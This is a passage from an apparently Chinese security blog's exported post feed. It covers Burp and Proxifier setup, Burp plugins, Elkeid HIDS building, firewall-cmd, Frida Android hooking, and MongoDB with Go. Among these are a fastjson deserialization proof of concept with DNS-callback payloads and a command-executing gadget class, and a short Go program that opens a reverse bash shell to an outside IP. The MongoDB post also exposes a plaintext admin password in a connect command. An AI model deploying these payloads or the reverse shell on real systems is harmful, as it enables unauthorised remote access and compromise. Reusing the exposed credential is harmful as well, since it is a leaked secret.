<p><strong>B.设置代理规则</strong><br>【profile】 -&gt; 【proxification Rules】<br><img src="/images/blog/536094a7113a658fbb8e7c742365b43d.png"><br>如下添加两条规则。<br><img src="/images/blog/0ac324ac891134568d8ebcf20f52587f.png"></p>
<p><img src="/images/blog/5bc54fbe20e89e03d4cd57a3956d697b.png"><br>点击确认，proxifier设置到此为止</p>
<h3 id="0x3-brupsuit设置"><a href="#0x3-brupsuit设置" class="headerlink" title="0x3 brupsuit设置"></a>0x3 brupsuit设置</h3><p>设置端口和IP要和Proxifier对应，不然抓不了包<br><img src="/images/blog/7fbce8e225ca1281cc7f4322184a81ae.png"></p>
<h3 id="0x4-抓包"><a href="#0x4-抓包" class="headerlink" title="0x4 抓包"></a>0x4 抓包</h3><p>随便打开一个小程序【奈雪的茶】，如下图所示，成功抓到请求包<br><img src="/images/blog/376ec165d58db4c843aae48ad39f38e0.png"></p>
<h3 id="0x5-注意"><a href="#0x5-注意" class="headerlink" title="0x5 注意"></a>0x5 注意</h3><p>如果抓不到HTTPS请求包的话，请先安装证书。</p>
]]></content>
      <tags>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>burpsuit插件推荐</title>
    <url>/2024/09/10/burpsuit%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<ul>
<li>AutoRepeater   【根据规则自动重放】<blockquote>
<p><a href="https://github.com/nccgroup/AutoRepeater">https://github.com/nccgroup/AutoRepeater</a></p>
</blockquote>
</li>
<li>trubo Intrude  【超级暴破插件】<blockquote>
<p><a href="https://github.com/PortSwigger/turbo-intruder/releases">https://github.com/PortSwigger/turbo-intruder/releases</a></p>
</blockquote>
</li>
<li>HaE 【基本正则过滤请求和响应中的敏感信息】<blockquote>
<p><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></p>
</blockquote>
</li>
<li>j2ee-scan【扫描java ee相关漏洞】<blockquote>
<p><a href="https://github.com/portswigger/j2ee-scan">https://github.com/portswigger/j2ee-scan</a></p>
</blockquote>
</li>
</ul>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson POC</title>
    <url>/2024/09/10/fastjson-POC/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;test.t1y0hvyndf58.padns.icu&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java.net.InetAddress</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.a;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">class Calc &#123;</span><br><span class="line">    public String age ;</span><br><span class="line"></span><br><span class="line">    public String getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(String age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;calc&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public Calc() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public void print()&#123;</span><br><span class="line">        System.out.println(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.a;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Hello world!</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line">        String js = &quot;&#123;\&quot;@type\&quot;:\&quot;com.example.a.Calc\&quot;,\&quot;age\&quot;:80&#125;&quot;;</span><br><span class="line">        JSON.parse(js);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>elkeid driver 内核模块 ko 编译 -注意事项</title>
    <url>/2024/09/10/elkeid-driver-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97-ko-%E7%BC%96%E8%AF%91-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># clone and build</span><br><span class="line">git clone https://github.com/bytedance/Elkeid.git</span><br></pre></td></tr></table></figure>

<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd Elkeid/driver/LKM/</span><br><span class="line">make clean &amp;&amp; make</span><br></pre></td></tr></table></figure>

<h4 id="插入内核并测试"><a href="#插入内核并测试" class="headerlink" title="插入内核并测试&gt;"></a>插入内核并测试&gt;</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># load and test (should run as root)</span><br><span class="line">insmod hids_driver.ko</span><br><span class="line">dmesg | tail -n 20</span><br><span class="line">test/rst -q</span><br></pre></td></tr></table></figure>

<h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># unload</span><br><span class="line">rmmod hids_driver</span><br></pre></td></tr></table></figure>

<h4 id="查看模块"><a href="#查看模块" class="headerlink" title="查看模块"></a>查看模块</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod|grep hids_driver</span><br></pre></td></tr></table></figure>

<h4 id="放到Nginx指向的目录下"><a href="#放到Nginx指向的目录下" class="headerlink" title="放到Nginx指向的目录下"></a>放到Nginx指向的目录下</h4><p>注意要改名，并且使用sha256生成一个签名文件放在同目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/elkeid/nginx/ElkeidAgent/agent/plugin/driver/ko</span><br></pre></td></tr></table></figure>


<h3 id="可能碰到的问题"><a href="#可能碰到的问题" class="headerlink" title="可能碰到的问题"></a>可能碰到的问题</h3><h4 id="make-lib-modules-build-没有那个文件或目录。"><a href="#make-lib-modules-build-没有那个文件或目录。" class="headerlink" title="make: &#x2F;lib&#x2F;modules&#x2F;****&#x2F;build: 没有那个文件或目录。"></a>make: &#x2F;lib&#x2F;modules&#x2F;****&#x2F;build: 没有那个文件或目录。</h4><p>可能原因是 Linux Kernel Header没装<br>首先尝试命令直接安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install kernel-devel-$(uname -r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>如果网络等问题导致失败，可以在如下网站手动下载然后安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://buildlogs.centos.org/</span><br></pre></td></tr></table></figure>

<p>手动安装，解压到当前目录下,把文件放到对应的目录下【&#x2F;usr&#x2F;src&#x2F;kernels&#x2F;****&#x2F;】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm2cpio kernel-devel-3.10.0-327.el7.x86_64.rpm | cpio -div</span><br></pre></td></tr></table></figure>

<p>（没有这一步应该已经行了）删除&#x2F;lib&#x2F;modules&#x2F;****下的build，然后建立软连接让build -&gt; &#x2F;usr&#x2F;src&#x2F;kernels&#x2F;****&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sv /usr/src/kernels/3.10.0-327.el7.x86_64/ /lib/modules/3.10.0-327.el7.x86_64/build</span><br></pre></td></tr></table></figure>
<h4 id="rpm解压"><a href="#rpm解压" class="headerlink" title="rpm解压"></a>rpm解压</h4><p>rpm2cpio filename | cpio -div</p>
<p>相关链接：<br><a href="https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md">https://github.com/bytedance/Elkeid/blob/main/driver/README-zh_CN.md</a></p>
<p>源码地址：<a href="https://www.central.org/dl/linuxdev/centos6/x86_64/">https://www.central.org/dl/linuxdev/centos6/x86_64/</a></p>
<p><a href="http://mirrors.aliyun.com/centos-vault/6.9/updates/x86_64/Packages/">http://mirrors.aliyun.com/centos-vault/6.9/updates/x86_64/Packages/</a></p>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>hids</tag>
      </tags>
  </entry>
  <entry>
    <title>elkeid添加新的baseline规则</title>
    <url>/2024/09/10/elkeid%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%9A%84baseline%E8%A7%84%E5%88%99/</url>
    <content><![CDATA[<h3 id="0x1-baseline-check-info"><a href="#0x1-baseline-check-info" class="headerlink" title="0x1 baseline_check_info"></a>0x1 baseline_check_info</h3><p>在此collections中添加一条记录，如下<br><img src="/images/blog/de9cb0f7a11f02d0b3972ca4d7235705.png"><br>baseline_id-1200 对应的规则文件名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;baseline_id&quot;: 1200,</span><br><span class="line">  &quot;baseline_version&quot;: &quot;1.0&quot;,</span><br><span class="line">  &quot;check_id&quot;: 18,</span><br><span class="line">  &quot;description&quot;: &quot;The PASS_MAX_DAYS parameter in /etc/login.defs allows an administrator to force passwords to expire once they reach a defined age. It is recommended that the PASS_MAX_DAYS parameter be set to less than or equal to 90 days.&quot;,</span><br><span class="line">  &quot;description_cn&quot;: &quot;redis未设置口令,攻击者可以直接连接redis后获取系统权限。&quot;,</span><br><span class="line">  &quot;security&quot;: &quot;high&quot;,</span><br><span class="line">  &quot;solution&quot;: &quot;Set the PASS_MAX_DAYS parameter to conform to site policy in /etc/login.defs: PASS_MAX_DAYS 90. Modify user parameters for all users with a password set to match: # chage --maxdays 90 &lt;user&gt;. Notes: You can also check this setting in /etc/shadow directly. The 5th field should be 365 or less for all users with a password. A value of -1 will disable password expiration. Additionally the password expiration must be greater than the minimum days between password changes or users will be unable to change their password&quot;,</span><br><span class="line">  &quot;solution_cn&quot;: &quot;打开redis.conf，找到requirepass所在的地方，修改为指定的密码，密码应符合复杂性要求，长度8位及以上，应包含英文数字和特殊字符，避免使用已公开的弱口令，如：abcd@1234等&quot;,</span><br><span class="line">  &quot;title&quot;: &quot;Ensure password expiration is 180 days or less&quot;,</span><br><span class="line">  &quot;title_cn&quot;: &quot;Redis 空口令&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;Identification&quot;,</span><br><span class="line">  &quot;type_cn&quot;: &quot;身份鉴别&quot;,</span><br><span class="line">  &quot;update_time&quot;: &#123;</span><br><span class="line">    &quot;$numberLong&quot;: &quot;1681176471&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;pass_rate&quot;: 87,</span><br><span class="line">  &quot;status&quot;: &quot;finished&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x2-baseline-info"><a href="#0x2-baseline-info" class="headerlink" title="0x2 baseline_info"></a>0x2 baseline_info</h3><p>修改check_id_list，添加一个数组元素，此元素为你配置文件中写好的check_id.<br><img src="/images/blog/cbef64750c54f1783362b4f8476ffd6c.png"><br><img src="/images/blog/948718bc1ffeebdb87ce603dd0a8704e.png"></p>
<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>编译虚拟机 builder     目录&#x2F;root&#x2F;Elkeid&#x2F;plugins</p>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>hids</tag>
      </tags>
  </entry>
  <entry>
    <title>firewall-cmd 使用&amp;示例</title>
    <url>/2024/09/10/firewall-cmd-%E4%BD%BF%E7%94%A8-%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>临时添加的规则，在reload后会失效</li>
</ul>
<h3 id="Zone"><a href="#Zone" class="headerlink" title="Zone"></a>Zone</h3><p>默认的zone是publice，在不指定zone的情况下规则会增加到public下</p>
<h4 id="新建新区域"><a href="#新建新区域" class="headerlink" title="新建新区域"></a>新建新区域</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --new-zone=my-zone</span><br></pre></td></tr></table></figure>

<h4 id="使新zone生效"><a href="#使新zone生效" class="headerlink" title="使新zone生效"></a>使新zone生效</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --set-default-zone=my-zone</span><br></pre></td></tr></table></figure>

<h4 id="添加IP新区域"><a href="#添加IP新区域" class="headerlink" title="添加IP新区域"></a>添加IP新区域</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=my-zone--add-source=172.31.36.33</span><br></pre></td></tr></table></figure>

<h4 id="添加端口新区域"><a href="#添加端口新区域" class="headerlink" title="添加端口新区域"></a>添加端口新区域</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=my-zone --add-port=443/tcp</span><br></pre></td></tr></table></figure>
<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>配置外部地址的端口转发时，需开启地址转换功能<br>firewall-cmd [–permanent] –add-masquerade<br>firewall-cmd [–permanent] –remove-masquerade</p>
<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[--permanent] [--zone=zone] --list-forward-ports					# 列出所有的转发规则</span><br><span class="line">[--permanent] [--zone=zone] --add-forward-port=&lt;转发规则&gt;			# 添加转发规则</span><br><span class="line">[--permanent] [--zone=zone] --remove-forward-port=&lt;转发规则&gt;			# 删除转发规则</span><br></pre></td></tr></table></figure>

<h4 id="转发规则"><a href="#转发规则" class="headerlink" title="转发规则"></a>转发规则</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 格式</span><br><span class="line">port=&lt;源端口号&gt;:proto=&lt;匹配协议&gt;:toport=&lt;目的端口号&gt;[:toaddr=&lt;目的IP地址&gt;]</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">port=888:proto=tcp:toport=22										# 将888端口的tcp流量转发至22端口</span><br><span class="line">port=8080:proto=tcp:toport=80										# 将8080端口的tcp流量转发至80端口</span><br><span class="line">port=8081:proto=tcp:toport=80:toaddr=192.168.10.10					# 将8081端口的tcp流量转发至192.168.10.10的80端口</span><br></pre></td></tr></table></figure>

<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-forward-port=port=443:proto=tcp:toport=27017     #443的流量转发到27017</span><br><span class="line">firewall-cmd --permanent --add-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=&quot;172.31.36.33&quot; port protocol=&quot;tcp&quot; port=&quot;443&quot; accept&quot;     # 允许 172.31.36.33 访问本机443端口</span><br></pre></td></tr></table></figure>

<h3 id="常规命令"><a href="#常规命令" class="headerlink" title="常规命令"></a>常规命令</h3><h4 id="端口开放、删除与查询"><a href="#端口开放、删除与查询" class="headerlink" title="端口开放、删除与查询"></a>端口开放、删除与查询</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-port=27017/tcp   # 开放27017端口访问</span><br><span class="line">firewall-cmd --permanent --zone=public --remove-port=27017/tcp  # 删除27017端口访问</span><br><span class="line">firewall-cmd --zone=public --list-ports   # 查看所有已放行的端口</span><br></pre></td></tr></table></figure>


<h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
  </entry>
  <entry>
    <title>frida重拾之hook脚本(二)</title>
    <url>/2024/09/10/frida%E9%87%8D%E6%8B%BE%E4%B9%8Bhook%E8%84%9A%E6%9C%AC-%E4%BA%8C/</url>
    <content><![CDATA[<h3 id="1-修改返回值"><a href="#1-修改返回值" class="headerlink" title="1.修改返回值"></a>1.修改返回值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">	var utils = Java.use(&quot;com.galaxylab.countdown.MainActivity&quot;);</span><br><span class="line">	utils.getBeg.overload().implementation = function()&#123;</span><br><span class="line">	  var res = this.getBeg()</span><br><span class="line">	  send(&quot;原值：&quot;+res)</span><br><span class="line">	  send(&quot;Hook Start...&quot;);</span><br><span class="line">	  send(&quot;返回 21204&quot;);</span><br><span class="line">	  return res;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>工具</tag>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>frida重拾之环境搭建——android测试（1）</title>
    <url>/2024/09/10/frida%E9%87%8D%E6%8B%BE%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E2%80%94%E2%80%94android%E6%B5%8B%E8%AF%95%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h3 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.11</span><br><span class="line">雷神模拟器</span><br><span class="line">windows 11</span><br></pre></td></tr></table></figure>


<h3 id="2-frida安装"><a href="#2-frida安装" class="headerlink" title="2.frida安装"></a>2.frida安装</h3><p>使用国内镜像加速<br>pip安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install frida -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip install frida-tools -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
<p>linux安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install frida</span><br><span class="line">sudo apt install frida-tools</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里需要注意的是windows下安装好后不会添加到环境变量，需要手动添加</p>
</blockquote>
<p>下载frida-server到本地<br>选择对应的版本即可，这里我们下载android的x86-64的版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/frida/frida/releases</span><br></pre></td></tr></table></figure>
<p><img src="/images/blog/d1df7766a7ca634731dfec2aa3337a9c.png"></p>
<h3 id="3-android环境准备"><a href="#3-android环境准备" class="headerlink" title="3.android环境准备"></a>3.android环境准备</h3><p>安装adb<br>windows </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载安装adb</span><br></pre></td></tr></table></figure>
<p>linux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install adb</span><br></pre></td></tr></table></figure>

<p>把frida-server上传到模拟器里，运行，并转发端口到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push frida-server /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb shell /data/local/tmp/frida-server</span><br></pre></td></tr></table></figure>

<p>然后测试一下是否成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure>

<p><img src="/images/blog/081e83f79baa284212b462f742d4f939.png"></p>
<h3 id="4-hook测试"><a href="#4-hook测试" class="headerlink" title="4.hook测试"></a>4.hook测试</h3><p>有如下代码，我们让getBeb返回一个较小的值即可让条件满足。<br><img src="/images/blog/9ef6cead0a95f6883f63d2278573eebf.png"></p>
<p>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">	var utils = Java.use(&quot;com.galaxylab.countdown.MainActivity&quot;);</span><br><span class="line">	utils.getBeg.overload().implementation = function()&#123;</span><br><span class="line">	  send(&quot;Hook Start...&quot;);</span><br><span class="line">	  send(&quot;返回 21204&quot;);</span><br><span class="line">	  return 21204;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>最后运行如下命令看下,成功运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.galaxylab.countdown -l hook.js</span><br></pre></td></tr></table></figure>
<p><img src="/images/blog/b98702f5d8d02436780a206bd6909b36.png"></p>
<h3 id="5-python运行"><a href="#5-python运行" class="headerlink" title="5.python运行"></a>5.python运行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import frida</span><br><span class="line">#process_name = &#x27;infosecadventures.fridademo&#x27;</span><br><span class="line">process_name = &#x27;com.galaxylab.countdown&#x27;</span><br><span class="line">#process_name = 20035</span><br><span class="line"># 发送信息回调函数</span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(f&quot;[*] &#123;message[&#x27;payload&#x27;]&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        device = frida.get_usb_device(timeout=1000)</span><br><span class="line">        print(&quot;* get usb device成功&quot;)</span><br><span class="line">    except:</span><br><span class="line">        device = frida.get_remote_device(timeout=1000)</span><br><span class="line">        print(&quot;* get remote device成功&quot;)</span><br><span class="line">    if not device:</span><br><span class="line">        print(&quot;* 连接到Frida Server失败&quot;)</span><br><span class="line">    else:</span><br><span class="line">        # process = device.attach(process_name)</span><br><span class="line">        pid = device.spawn([process_name])</span><br><span class="line">        device.resume(pid)</span><br><span class="line">        time.sleep(1) </span><br><span class="line">        process = device.attach(pid)</span><br><span class="line">        # 加载JS脚本</span><br><span class="line">        js = open(&#x27;hook.js&#x27;, encoding=&#x27;utf-8&#x27;).read()</span><br><span class="line">        script = process.create_script(js)</span><br><span class="line">        script.on(&#x27;message&#x27;, on_message)</span><br><span class="line">        script.load()</span><br><span class="line">        # 读取返回输入</span><br><span class="line">        input()</span><br><span class="line">        script.unload()</span><br></pre></td></tr></table></figure>
<p><img src="/images/blog/6c861bf0f452cd9d9801e200fa608897.png"></p>
]]></content>
      <tags>
        <tag>工具</tag>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>golang使用国内代理</title>
    <url>/2024/09/10/golang%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ go env -w GO111MODULE=on</span><br><span class="line">$ go env -w GOPROXY=https://goproxy.cn,direct</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>golang</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>golang反弹shell代码示例</title>
    <url>/2024/09/10/golang%E5%8F%8D%E5%BC%B9shell%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;fmt&quot;</span><br><span class="line">  &quot;os/exec&quot;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    cmd := exec.Command(&quot;/bin/bash&quot;,&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/12.33.22.33/7586 0&gt;&amp;1 &quot; ) </span><br><span class="line">    out, err := cmd.Output()  </span><br><span class="line">    if err != nil &#123;  </span><br><span class="line">        fmt.Println(err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    fmt.Println(string(out))  </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>golang</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>golang mongodb 常见操作</title>
    <url>/2024/09/10/golang-mongodb-%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>下载地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.mongodb.com/download-center/community</span><br></pre></td></tr></table></figure>
<p>打开客户端并连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongo --username admin  --password k05184988g37sndh7d --authenticationDatabase admin --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure>
<p>创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use go_db;</span><br></pre></td></tr></table></figure>
<p>创建集合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db.createCollection(&quot;student&quot;);</span><br></pre></td></tr></table></figure>

<p>下载驱动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go get github.com/mongodb/mongo-go-driver</span><br></pre></td></tr></table></figure>
<p>连接mongoDB</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;context&quot;</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo&quot;</span><br><span class="line">    &quot;go.mongodb.org/mongo-driver/mongo/options&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var client *mongo.Client</span><br><span class="line"></span><br><span class="line">func initDB()  &#123;</span><br><span class="line">    // 设置客户端连接配置</span><br><span class="line">    clientOptions := options.Client().ApplyURI(&quot;mongodb://localhost:27017&quot;)</span><br><span class="line">    // 连接到MongoDB</span><br><span class="line">    var err error</span><br><span class="line">    client, err = mongo.Connect(context.TODO(), clientOptions)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    // 检查连接</span><br><span class="line">    err = client.Ping(context.TODO(), nil)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(&quot;Connected to MongoDB!&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    initDB()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connected to MongoDB!</span><br></pre></td></tr></table></figure>
<h4 id="BSON简介"><a href="#BSON简介" class="headerlink" title="BSON简介"></a>BSON简介</h4><p>MongoDB中的JSON文档存储在名为BSON(二进制编码的JSON)的二进制表示中。与其他将JSON数据存储为简单字符串和数字的数据库不同，BSON编码扩展了JSON表示，使其包含额外的类型，如int、long、date、浮点数和decimal128。这使得应用程序更容易可靠地处理、排序和比较数据。</p>
<p>连接MongoDB的Go驱动程序中有两大类型表示BSON数据：D和Raw。</p>
<p>类型D家族被用来简洁地构建使用本地Go类型的BSON对象。这对于构造传递给MongoDB的命令特别有用。D家族包括四类:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D：一个BSON文档。这种类型应该在顺序重要的情况下使用，比如MongoDB命令。</span><br><span class="line">M：一张无序的map。它和D是一样的，只是它不保持顺序。</span><br><span class="line">A：一个BSON数组。</span><br><span class="line">E：D里面的一个元素。</span><br></pre></td></tr></table></figure>
<p>要使用BSON，需要先导入下面的包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;go.mongodb.org/mongo-driver/bson&quot;</span><br></pre></td></tr></table></figure>
<p>下面是一个使用D类型构建的过滤器文档的例子，它可以用来查找name字段与’张三’或’李四’匹配的文档:</p>
